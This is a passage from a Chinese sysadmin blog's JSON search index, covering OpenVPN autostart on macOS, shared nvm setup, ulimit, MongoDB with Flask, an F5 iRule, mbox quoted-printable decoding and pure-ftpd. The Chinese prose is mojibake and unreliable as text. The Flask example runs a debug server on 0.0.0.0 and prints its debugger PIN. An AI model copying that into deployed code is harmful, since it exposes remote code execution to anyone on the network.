-loop 0 1.jpg 2.jpg 3.jpg 4.jpg result.gif -loop 0 è¡¨ç¤ºæ— é™å¾ªç¯ -delay 30 è¡¨ç¤ºæ¯å¸§ä¹‹é—´ç­‰å¾…çš„æ—¶é—´\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-jpg_gif/","series":null,"tags":null,"title":"å¦‚ä½•æŠŠjpgåˆæˆgif"},{"categories":null,"content":"æ²¡åŠæ³•ï¼Œç½‘ç»œç¯å¢ƒå¤ªçƒ‚ï¼Œåªèƒ½è£…ä¸ªopenvpn clientè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç³»ç»Ÿæ˜¯macï¼Œè¦æ±‚ä¸€ç›´ä¿æŒè¿æ¥ï¼Œè¿˜è¦èƒ½é‡å¯è‡ªåŠ¨è¿ã€‚\nå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\n1.å®‰è£…openvpn\n1brew install openvpn 2.å®‰è£…tun/tapé©±åŠ¨\n1wget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz 2tar zxvf tuntap_20150118.tar.gz 3 4ç„¶ååœ¨mac osæ¡Œé¢ä¸‹ï¼ŒåŒå‡»tuntap_20150118.pkgå®‰è£… 3.å‡†å¤‡client.confæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯æ ‡å‡†çš„clientç«¯æ–‡ä»¶\n4.æµ‹è¯•æ˜¯å¦å¯ä»¥æ­£å¸¸å¯åŠ¨\n1/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf 5.æµ‹è¯•æˆåŠŸååœ¨mac osç¼–å†™plistæ–‡ä»¶\n1vi /Library/LaunchDaemons/net.openvpn.plist 2\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; 3\u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34; 4\u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;;\u0026gt; 5\u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; 6 7\u0026lt;dict\u0026gt; 8 \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; 9 \u0026lt;string\u0026gt;net.openvpn\u0026lt;/string\u0026gt; 10 \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt; 11 \u0026lt;dict\u0026gt; 12 \u0026lt;key\u0026gt;NetworkState\u0026lt;/key\u0026gt; 13 \u0026lt;true/\u0026gt; 14 \u0026lt;/dict\u0026gt; 15 \u0026lt;key\u0026gt;Program\u0026lt;/key\u0026gt; 16 \u0026lt;string\u0026gt;/usr/local/opt/openvpn/sbin/openvpn\u0026lt;/string\u0026gt; 17 \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; 18 \u0026lt;array\u0026gt; 19 \u0026lt;string\u0026gt;openvpn\u0026lt;/string\u0026gt; 20 \u0026lt;string\u0026gt;--config\u0026lt;/string\u0026gt; 21 \u0026lt;string\u0026gt;/usr/local/etc/openvpn/client.conf\u0026lt;/string\u0026gt; 22 \u0026lt;/array\u0026gt; 23 \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt; 24 \u0026lt;true/\u0026gt; 25 \u0026lt;key\u0026gt;TimeOut\u0026lt;/key\u0026gt; 26 \u0026lt;integer\u0026gt;90\u0026lt;/integer\u0026gt; 27 \u0026lt;key\u0026gt;WorkingDirectory\u0026lt;/key\u0026gt; 28 \u0026lt;string\u0026gt;/usr/local/etc/openvpn\u0026lt;/string\u0026gt; 29\u0026lt;/dict\u0026gt; 30\u0026lt;/plist\u0026gt; 6.ç„¶åè¿è¡Œ\n1sudo chown root:wheel /Library/LaunchDaemon/net.openvpn.plist 2 3sudo launchctl load /Library/LaunchDaemon/net.openvpn.plist æœ‰ç”¨çš„å‘½ä»¤ï¼š\n1sudo launchctl load /Library/LaunchDaemon/net.openvpn.plist 2sudo launchctl unload /Library/LaunchDaemon/net.openvpn.plist 3sudo launchctl start /Library/LaunchDaemon/net.openvpn 4sudo launchctl stop /Library/LaunchDaemon/net.openvpn ","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-macos_vpn/","series":null,"tags":null,"title":"Mac Osä¸‹å®‰è£…openvpnå®¢æˆ·ç«¯å¹¶è®¾ç½®è‡ªå¯åŠ¨"},{"categories":null,"content":"æœ€è¿‘å·¥ä½œæ¯”è¾ƒå¤šåœ¨Ubuntuå¹³å°ä¸‹ã€‚\nç”¨visualenvå’Œnvmæ¯”è¾ƒå¤šï¼Œä½†æ˜¯nvmé‡åˆ°çš„é—®é¢˜æ¯”è¾ƒå¤šã€‚\næ¯”å¦‚jenkinsè°ƒç”¨nvmå°±æ¯”è¾ƒéº»çƒ¦\nå¦‚ä½•ç”¨ç”¨rootç”¨æˆ·ç»™æ‰€æœ‰ç”¨æˆ·éƒ½è£…ä¸Šç»Ÿä¸€çš„nvmå‘¢ï¼Ÿ\n1ã€é¦–å…ˆå®‰è£…åŸºæœ¬ä¾èµ–åŒ…:\n1apt-get install build-essential openssl libssl-dev curl 2ã€å»ºä¸ªå…¬å…±ç»„ï¼Œè¿™ä¸ªç»„çš„æˆå‘˜å¯ä»¥æ§åˆ¶nvmï¼š\n1groupadd dev 3ã€gitå…‹éš†ä¸‹è½½nvmçš„ä»£ç \n1git clone https://github.com/creationix/nvm.git /opt/nvm 4ã€å»ºç«‹ä¸¤ä¸ªå…¬ç”¨ç›®å½•ï¼Œä¸€ä¸ªæ˜¯æ”¾nvmï¼Œä¸€ä¸ªæ˜¯æ”¾nodejsçš„npmï¼Œå¹¶è®¾ç½®å¥½æƒé™\n1mkdir /usr/local/nvm 2mkdir /usr/local/node 3chown -R root:dev /usr/local/nvm 4chmod -R 775 /usr/local/nvm 5chown -R root:dev /usr/local/node 6chmod -R 775 /usr/local/node 5ã€å»ºç«‹å¥½å…¬ç”¨çš„ /etc/profile.d/nvm.sh ä¾›æ‰€æœ‰äººsourceç”¨ï¼Œæ³¨æ„ï¼Œsourceå‘½ä»¤æ˜¯bashä¸‹ç”¨çš„ï¼Œå¦‚æœæ˜¯shï¼Œå°±ç”¨.æ›¿ä»£ã€‚\n1export NVM_DIR=/usr/local/nvm 2source /opt/nvm/nvm.sh 3 4export NPM_CONFIG_PREFIX=/usr/local/node 5export PATH=\u0026#34;/usr/local/node/bin:$PATH\u0026#34; 6ã€æ–­å¼€é‡æ–°ç™»å½•ï¼ŒåŠ è½½nvm\n1nvm --version 7ã€å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„node\n1nvm install V18.18.2 8ã€è®¾ç½®ç¼ºçœnodeçš„ç‰ˆæœ¬\n1nvm alias default V18.18.2 9ã€éšåæŠŠç”¨æˆ·æ‹‰è¿›devç»„ï¼Œç„¶åç™»é™†å°±å¯ä»¥äº†ã€‚éªŒè¯å‘½ä»¤å¦‚ä¸‹ï¼š\n1nvm list 2node -v ","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-nvm_forall/","series":null,"tags":null,"title":"Ubuntuä¸‹å¦‚ä½•ç»™æ‰€æœ‰ç”¨æˆ·å®‰è£…nodejsçš„nvm"},{"categories":null,"content":"åŸºæœ¬å¸¸è¯†ï¼Œå„ç§è¯­ç„‰ä¸è¯¦å•Šï¼Œå…¶å®ulimitæœ€å¸¸ç”¨çš„å°±ä¸¤ä¸ªå‚æ•°\n1-u number: å•ä¸ªç”¨æˆ·èƒ½è¿è¡Œçš„æœ€å¤§è¿›ç¨‹æ•° 2-n number: å•ä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§å€¼ï¼Œç¼ºçœ1024 æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦è®¾ç½®ï¼ŒHardå’ŒSoftï¼ŒHardæ˜¯Softçš„æœ€é«˜é™å€¼ï¼Œå¤©èŠ±æ¿ã€‚è¿™ä¸¤ä¸ªå€¼éƒ½å¯ä»¥é’ˆå¯¹æŸç”¨æˆ·å•ç‹¬è®¾ç½®ã€‚\næ‰€ä»¥è®¾æ³•å¦‚ä¸‹ï¼š\n1ulimit -S -n 10240 2ulimit -H -n 20480 3ulimit -S -u 10240 4ulimit -H -u 20480 å¯ä»¥åœ¨/etc/security/limits.confé‡Œè®¾ç½®\n1* soft nofile 65536 2* hard nofile 65536 3* soft nproc 131072 4* hard nproc 131072 ä¹Ÿå¯ä»¥åœ¨/etc/rc.d/rc.localä¸­ç”¨å‘½ä»¤è®¾ç½®\n1cat /etc/rc.d/rc.local 2... 3ulimit -u 204800 -HSn 204800 4... ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ulimit/","series":null,"tags":null,"title":"Ulimitçš„ç”¨æ³•"},{"categories":null,"content":"é¦–å…ˆæ˜¯å®‰è£…mongodb\n1yum install -y mongodb-server mongodb 2 3Installing for dependencies: 4 boost-filesystem 5 boost-iostreams 6 boost-program-options 7 boost-system 8 boost-thread 9 gperftools-libs 10 libicu 11 libunwind 12 v8 ä¼šè£…ä¸€å †ä¾èµ–åŒ…ï¼Œbooståº“ï¼Œicuåº“ï¼Œv8åº“ï¼Œgperftoolsåº“ï¼Œéƒ½æ˜¯å¾ˆå‰å®³çš„åº“å•Šï¼\nå¯åŠ¨ï¼š\n1service mongod start å¯¼å…¥æµ·é‡æ•°æ®ï¼š\n1[root@ovs-16-11-2 ~]# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline 2connected to: 127.0.0.1 3Thu Jul 28 09:50:47.002 Progress: 39118658/470754183 8% 4Thu Jul 28 09:50:47.002 74400 24800/second 5Thu Jul 28 09:50:50.033 Progress: 80042213/470754183 17% 6Thu Jul 28 09:50:50.033 150700 25116/second 7Thu Jul 28 09:50:53.145 Progress: 108143323/470754183 22% 8Thu Jul 28 09:50:53.145 202700 22522/second 9Thu Jul 28 09:50:56.004 Progress: 149781879/470754183 31% 10Thu Jul 28 09:50:56.004 280000 23333/second 11Thu Jul 28 09:50:59.001 Progress: 179705162/470754183 38% 12Thu Jul 28 09:50:59.001 336200 22413/second 13Thu Jul 28 09:51:03.385 Progress: 212197023/470754183 45% 14Thu Jul 28 09:51:03.385 396400 20863/second 15Thu Jul 28 09:51:06.015 Progress: 236552399/470754183 50% 16Thu Jul 28 09:51:06.015 441700 20077/second 17Thu Jul 28 09:51:09.299 Progress: 264365847/470754183 56% 18Thu Jul 28 09:51:09.299 493300 19732/second 19Thu Jul 28 09:51:12.001 Progress: 304790148/470754183 64% 20Thu Jul 28 09:51:12.001 568500 20303/second 21Thu Jul 28 09:51:15.033 Progress: 323508057/470754183 68% 22Thu Jul 28 09:51:15.033 603300 19461/second 23Thu Jul 28 09:51:18.607 Progress: 361610334/470754183 76% 24Thu Jul 28 09:51:18.607 674200 19829/second 25Thu Jul 28 09:51:21.000 Progress: 393748962/470754183 83% 26Thu Jul 28 09:51:21.000 733700 19829/second 27Thu Jul 28 09:51:24.007 Progress: 427667505/470754183 90% 28Thu Jul 28 09:51:24.007 796900 19922/second 29Thu Jul 28 09:51:27.001 Progress: 459658299/470754183 97% 30Thu Jul 28 09:51:27.001 857300 19937/second 31Thu Jul 28 09:51:27.793 check 9 878853 32Thu Jul 28 09:51:27.979 imported 878852 objects è¿›å…¥å‘½ä»¤è¡Œï¼Œçœ‹çœ‹åº“çš„æ•´ä½“æƒ…å†µï¼š\n1mongo 2use mydb 3show collections 4db.prj01.findOne() å®Œæ•´ç»“æœå¦‚ä¸‹ï¼š\n1mongo 2MongoDB shell version: 2.4.14 3connecting to: test 4\u0026gt; use mydb 5switched to db mydb 6\u0026gt; show collections 7prj01 8system.indexes 9\u0026gt; db.prj01.findOne() 10{ 11 \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;579964f41d36d69d1752f82b\u0026#34;), 12 \u0026#34;_projectid\u0026#34; : \u0026#34;7342bd01a2a7725ce033a179d22e382d\u0026#34;, 13 \u0026#34;_teacher_acctid\u0026#34; : \u0026#34;5c43ef5eac0f5857c266baa1ccfa3d3f\u0026#34;, 14 \u0026#34;_schoolid\u0026#34; : \u0026#34;9e72d6f2f1e9367b578b6479aa5852b7\u0026#34;, 15 \u0026#34;school_ncesid\u0026#34; : NumberLong(\u0026#34;360009702803\u0026#34;), 16 \u0026#34;school_latitude\u0026#34; : 40.688454, 17 \u0026#34;school_longitude\u0026#34; : -73.910432, 18 \u0026#34;school_city\u0026#34; : \u0026#34;Brooklyn\u0026#34;, 19 \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, 20 \u0026#34;school_zip\u0026#34; : 11207, 21 \u0026#34;school_metro\u0026#34; : \u0026#34;urban\u0026#34;, 22 \u0026#34;school_district\u0026#34; : \u0026#34;New York City Dept Of Ed\u0026#34;, 23 \u0026#34;school_county\u0026#34; : \u0026#34;Kings (Brooklyn)\u0026#34;, 24 \u0026#34;school_charter\u0026#34; : \u0026#34;f\u0026#34;, 25 \u0026#34;school_magnet\u0026#34; : \u0026#34;t\u0026#34;, 26 \u0026#34;school_year_round\u0026#34; : \u0026#34;f\u0026#34;, 27 \u0026#34;school_nlns\u0026#34; : \u0026#34;f\u0026#34;, 28 \u0026#34;school_kipp\u0026#34; : \u0026#34;f\u0026#34;, 29 \u0026#34;school_charter_ready_promise\u0026#34; : \u0026#34;f\u0026#34;, 30 \u0026#34;teacher_prefix\u0026#34; : \u0026#34;Mr.\u0026#34;, 31 \u0026#34;teacher_teach_for_america\u0026#34; : \u0026#34;f\u0026#34;, 32 \u0026#34;teacher_ny_teaching_fellow\u0026#34; : \u0026#34;f\u0026#34;, 33 \u0026#34;primary_focus_subject\u0026#34; : \u0026#34;Other\u0026#34;, 34 \u0026#34;primary_focus_area\u0026#34; : \u0026#34;Applied Learning\u0026#34;, 35 \u0026#34;secondary_focus_subject\u0026#34; : \u0026#34;\u0026#34;, 36 \u0026#34;secondary_focus_area\u0026#34; : \u0026#34;\u0026#34;, 37 \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, 38 \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, 39 \u0026#34;grade_level\u0026#34; : \u0026#34;Grades 6-8\u0026#34;, 40 \u0026#34;vendor_shipping_charges\u0026#34; : \u0026#34;\u0026#34;, 41 \u0026#34;sales_tax\u0026#34; : \u0026#34;\u0026#34;, 42 \u0026#34;payment_processing_charges\u0026#34; : \u0026#34;\u0026#34;, 43 \u0026#34;fulfillment_labor_materials\u0026#34; : \u0026#34;\u0026#34;, 44 \u0026#34;total_price_excluding_optional_support\u0026#34; : 229, 45 \u0026#34;total_price_including_optional_support\u0026#34; : 279.27, 46 \u0026#34;students_reached\u0026#34; : 0, 47 \u0026#34;total_donations\u0026#34; : 251, 48 \u0026#34;num_donors\u0026#34; : 1, 49 \u0026#34;eligible_double_your_impact_match\u0026#34; : \u0026#34;f\u0026#34;, 50 \u0026#34;eligible_almost_home_match\u0026#34; : \u0026#34;f\u0026#34;, 51 \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, 52 \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34;, 53 \u0026#34;date_completed\u0026#34; : \u0026#34;2002-09-23 00:00:00\u0026#34;, 54 \u0026#34;date_thank_you_packet_mailed\u0026#34; : \u0026#34;2003-01-27 00:00:00\u0026#34;, 55 \u0026#34;date_expiration\u0026#34; : \u0026#34;2003-12-31 00:00:00\u0026#34; 56} 57\u0026gt; å¤ªå¤šå­—æ®µäº†ï¼Œå¦‚æœæˆ‘ä»¬å°±æƒ³è¦å…¶ä¸­çš„6ä¸ªå­—æ®µï¼š\n1\u0026gt; db.prj01.findOne({}, {school_state:1, resource_type:1, poverty_level:1, date_posted:1, total_donations:1, funding_status:1, _id:0}) 2{ 3 \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, 4 \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, 5 \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, 6 \u0026#34;total_donations\u0026#34; : 251, 7 \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, 8 \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34; 9} è£…ä¸ªpymongo\n1python -m pip install pymongo æµ‹ä¸€ä¸‹ï¼Œè¿›å…¥pythonå‘½ä»¤è¡Œï¼š\n1python 2... 3from pymongo import MongoClient 4MONGODB_HOST = \u0026#39;localhost\u0026#39; 5MONGODB_PORT = 27017 6DBS_NAME = \u0026#39;mydb\u0026#39; 7COLLECTION_NAME = \u0026#39;prj01\u0026#39; 8FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} 9connection = MongoClient(MONGODB_HOST, MONGODB_PORT) 10collection = connection[DBS_NAME][COLLECTION_NAME] 11projects = collection.find(projection=FIELDS) 12for project in projects: 13 print project 14... 15{u\u0026#39;school_state\u0026#39;: u\u0026#39;MO\u0026#39;, u\u0026#39;date_posted\u0026#39;: u\u0026#39;2015-08-18 00:00:00\u0026#39;, u\u0026#39;poverty_level\u0026#39;: u\u0026#39;highest poverty\u0026#39;, u\u0026#39;resource_type\u0026#39;: u\u0026#39;Books\u0026#39;, u\u0026#39;total_donations\u0026#39;: 0} 16... æ•°æ®ä¼šç–¯ç‹‚æ˜¾ç¤ºä¸€é˜µå­ï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„pythonè®¿é—®mongodbçš„ç¨‹åºäº†ã€‚\nä¸‹é¢æˆ‘ä»¬æ¥å®Œæˆflaskçš„éƒ¨åˆ†\nè£…ä¸ªflask\n1python -m pip install flask å»ºç«‹ä¸ªæ–‡ä»¶å¤¹flask01ï¼Œå»ºç«‹ç›®å½•templates\n1flask01 2â”œâ”€â”€ run.py 3â””â”€â”€ templates 4 â””â”€â”€ index.html å‡†å¤‡ä¸€ä¸ªé¦–é¡µæ–‡ä»¶index.htmlæ”¾åˆ°ç›®å½•templatesä¸‹\n1cat index.html 2\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; å‡†å¤‡ä¸»ç¨‹åºrun.py\n1from flask import Flask 2from flask import render_template 3 4app = Flask(__name__) 5 6@app.route(\u0026#34;/\u0026#34;) 7def index(): 8 return render_template(\u0026#34;index.html\u0026#34;) 9 10if __name__ == \u0026#34;__main__\u0026#34;: 11 app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) åˆ†é…ä¸ªurlæ¥å­˜å–mongodb\n1from flask import Flask 2from flask import render_template 3from pymongo import MongoClient 4import json 5from bson import json_util 6from bson.json_util import dumps 7 8app = Flask(__name__) 9 10MONGODB_HOST = \u0026#39;localhost\u0026#39; 11MONGODB_PORT = 27017 12DBS_NAME = \u0026#39;mydb\u0026#39; 13COLLECTION_NAME = \u0026#39;prj01\u0026#39; 14FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} 15 16@app.route(\u0026#34;/\u0026#34;) 17def index(): 18 return render_template(\u0026#34;index.html\u0026#34;) 19 20@app.route(\u0026#34;/mydb/prj01\u0026#34;) 21def mydb_prj01(): 22 connection = MongoClient(MONGODB_HOST, MONGODB_PORT) 23 collection = connection[DBS_NAME][COLLECTION_NAME] 24 projects = collection.find(projection=FIELDS) 25 json_projects = [] 26 for project in projects: 27 json_projects.append(project) 28 json_projects = json.dumps(json_projects, default=json_util.default) 29 connection.close() 30 return json_projects 31 32if __name__ == \u0026#34;__main__\u0026#34;: 33 app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) è¿è¡Œä¸€ä¸‹ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€è¿™ä¸ªurlï¼š\n1python run.py 2 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) 3 * Restarting with stat 4 * Debugger is active! 5 * Debugger pin code: 373-144-494 6172.16.8.1 - - [28/Jul/2016 10:13:27] \u0026#34;GET /mydb/prj01 HTTP/1.1\u0026#34; 200 - ç»“æœå¾ˆæ˜æ˜¾æ˜¯ä¸ªjson\n1[{\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-13 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;highest poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 251}, 2 {\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-16 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;moderate poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 125}, 3... 4] ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-flask_mongo/","series":null,"tags":null,"title":"Flask/Pythonå¯¹mongodbçš„ä¸€äº›æ“ä½œ"},{"categories":null,"content":"å…¬å¸çš„ç½‘ç«™è¦è¿‡googleè®¤è¯ï¼Œéœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œgoogleb1e6d9a50ea8xxxx.html\nå†…å®¹å¦‚ä¸‹ï¼š\n1google-site-verification: googleb1e6d9a50ea8xxxx.html è¿™ä¸ªæ— æ¯”ç®€å•ï¼Œæ€ä¹ˆåˆè·ŸF5å’Œiruleæ‰¯ä¸Šå…³ç³»äº†å‘¢ï¼Ÿï¼\nå“ï¼Œå› ä¸ºå±…ç„¶è¦åšä¸¤ä¸ªåŸŸåï¼Œm.xxx.comå’Œh.xxx.comï¼Œè¿™ä¸¤ä¸ªåŸŸåéƒ½è¦è¿‡è®¤è¯ï¼Œè€Œä¸”æ‚²å‰§çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªåŸŸåå®é™…ä»£ç†çš„æ˜¯åŒä¸€å°åç«¯æœåŠ¡å™¨çš„åŒä¸€ä¸ªtomcatè¿›ç¨‹ã€‚\né‰´äºè¿™ä¸ªä¸œè¥¿è¿™ä¹ˆç®€å•ï¼Œå¹²è„†åœ¨F5ä¸Šæ¥ä¸€æ®µiruleè§£å†³é—®é¢˜ï¼š\n1when HTTP_REQUEST { 2 if { ([string tolower [HTTP::path]] starts_with \u0026#34;/googleb1e6d9a50ea8xxxx.html\u0026#34;) \u0026amp;\u0026amp; ([string tolower [HTTP::host]] equals \u0026#34;m.xxx.com\u0026#34;) } { 3 HTTP::respond 200 content \u0026#34;google-site-verification: googleb1e6d9a50ea8xxxx.html\u0026#34; 4 } 5} ç”±äºæ²¡æœ‰å¤ç”¨ipï¼Œæ‰€ä»¥åœ¨h.xxx.comåŒæ ·ä¿®æ”¹ä»¥ä¸Šè„šæœ¬å¹¶åº”ç”¨å³å¯ã€‚\nå¦‚æœæ˜¯ç©·å…‰è›‹ä½œé£ï¼Œåœ¨F5ä¸Šå¤ç”¨äº†IPåšäº†è™šæ‹Ÿä¸»æœºè½¬å‘ï¼Œä¹Ÿä¿®æ”¹ä¿®æ”¹è„šæœ¬å³å¯ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-f5_irule/","series":null,"tags":null,"title":"F5 Iruleä¹‹googleç«™é•¿è®¤è¯åˆ«æ ·ç”¨æ³•"},{"categories":null,"content":"æœ€è¿‘åœ¨æé‚®å±€ã€‚æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œå°±æ˜¯æ‰“å¼€mboxçš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ï¼š\n/var/spool/mail/root\né‡Œé¢ä¿¡ä»¶çš„éƒ¨åˆ†æœ‰å¥‡æ€ªçš„3Då­—ç¬¦ï¼š\n1\u0026lt;table cellpadding=3D\u0026#34;0\u0026#34; cellspacing=3D\u0026#34;0\u0026#34; style=3D\u0026#34;text-align:le= 2ft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa= æ³¨æ„ï¼Œä¸­é—´å¤šäº†è‹¥å¹²ä¸ª3Dï¼Œæœ€åä¹Ÿå¤šäº†=å·\nè¿™æ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ\næœäº†ä¸€åœˆï¼ŒåŸæ¥è¿™æ˜¯quoted-printableç¼–è§£ç ï¼Œè·ŸBase64ç±»ä¼¼ï¼Œbase64å’Œquoted-printableè¿™ä¸¤ç§ç¼–ç éƒ½æ˜¯åœ¨ç”µå­é‚®ä»¶ä¸­å¸¸è§çš„ç¼–ç æ–¹å¼ã€‚\nåŸºæœ¬çŸ¥è¯†ï¼š\nå¦‚æœ=å·å‡ºç°åœ¨ä¸€è¡Œæœ€åï¼Œè¡¨ç¤ºæ¢è¡Œï¼Œé‚£ä¹ˆï¼š he= llo æ„æ€å°±æ˜¯è¿èµ·æ¥çš„hello å¦‚æœä¸­é—´å‡ºç°=3Dï¼Œé‚£å°±æ˜¯ä¸€ä¸ª=å·çš„æ„æ€ æ‰€ä»¥style=3D\u0026quot;text\u0026quot;æ„æ€å°±æ˜¯style=\u0026ldquo;text\u0026rdquo; è‹±æ–‡å­—ç¬¦é™¤äº†=ä»¥å¤–ä¸åšå¤„ç†ï¼Œå…¶ä»–å­—ç¬¦çš„ç¼–ç ä¸º=åŠ è¿™ä¸ªå­—ç¬¦çš„ä¸¤ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°ã€‚ å¼„æ˜ç™½äº†å§ã€‚\nç»™ä¸€æ®µå¤„ç†mboxçš„pythonç¨‹åºï¼Œå¯ä»¥ç”¨æ¥è¯»é‚®ä»¶ï¼š\n1#!/usr/bin/env python 2# -*- coding: utf-8 -*- 3 4import mailbox 5import base64 6import os 7import sys 8import email 9 10import quopri 11 12 13filename = \u0026#34;/var/spool/mail/zrr\u0026#34; 14 15mb = mailbox.mbox(filename) 16nmes = len(mb) 17 18for i in range(len(mb)): 19 print \u0026#34;\\n\\n\\n\\n\\n\u0026#34; 20 print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; 21 print \u0026#34;Email\u0026#34;, i 22 print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; 23 24 mes = mb.get_message(i) 25 em = email.message_from_string(mes.as_string()) 26 27 subject = em.get(\u0026#39;Subject\u0026#39;) 28 if subject.find(\u0026#39;=?\u0026#39;) != -1: 29 ll = email.header.decode_header(subject) 30 subject = \u0026#34;\u0026#34; 31 for l in ll: 32 subject = subject + l[0] 33 34 em_from = em.get(\u0026#39;From\u0026#39;) 35 if em_from.find(\u0026#39;=?\u0026#39;) != -1: 36 ll = email.header.decode_header(em_from) 37 em_from = \u0026#34;\u0026#34; 38 for l in ll: 39 em_from = em_from + l[0] 40 41 print \u0026#34;From: %s - Subject: %s\u0026#34; %(em_from, subject) 42 print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; 43 44 if mes.is_multipart(): 45 for part in mes.get_payload(): 46 print quopri.decodestring(part.get_payload()) 47 else: 48 print quopri.decodestring(mes.get_payload()) ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-mbox_3d/","series":null,"tags":null,"title":"Mboxæ–‡ä»¶ä¸­çš„=3Dæ˜¯ä»€ä¹ˆé¬¼(quoted-Printableç¼–ç )"},{"categories":null,"content":"ç”¨è¿‡proftpdå’Œvs-ftpdï¼Œproftpdæœ‰å·¨ææ€–çš„sftpç»†ç²’åº¦æ§åˆ¶ï¼Œç‰¹æ®Šåœºåˆéå¸¸å¥½ã€‚\nä½†æ˜¯æ€»è§‰å¾—éƒ½å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬æ–‡ä»¶ç³»ç»Ÿçš„åº•å±‚æ˜¯GlusterFSï¼Œåœ¨ä¹‹ä¸Šå»ºç«‹è™šç”¨æˆ·ï¼Œç”¨proftpdå’Œvs-ftpdéƒ½æ„Ÿè§‰å¤æ‚ã€‚\næ‰€ä»¥ä¸€ç›´åœ¨æ‰¾ç®€å•çš„æ–¹æ³•ï¼Œæœ€åå‘ç°äº†pure-ftpdï¼Œå¾ˆç®€å•ï¼ï¼ï¼\né¦–å…ˆå»ºä¸€ä¸ªæ— ä»»ä½•ç™»é™†æƒçš„æ–°ç”¨æˆ·ï¼Œæ³¨æ„ï¼Œuidå¿…é¡»åœ¨500ä»¥ä¸Šï¼Œä¸èƒ½ç”¨ç³»ç»Ÿç¼ºçœçš„ç”¨æˆ·ftpï¼Œåé¢æ”¹pure-ftpd.confæ—¶ä¼šæœ‰è¯´æ˜ï¼š\n1useradd -u1000 -U -s/sbin/nologin -M ftpuser å®‰è£…pure-ftpd\n1yum -y install pure-ftpd ä¿®æ”¹é…ç½®ï¼š\n1vi /etc/pure-ftpd/pure-ftpd.conf 2ChrootEveryone yes 3AnonymousOnly no 4NoAnonymous yes 5PureDB /etc/pure-ftpd/pureftpd.pdb 6#PAMAuthentication yes 7UnixAuthentication yes 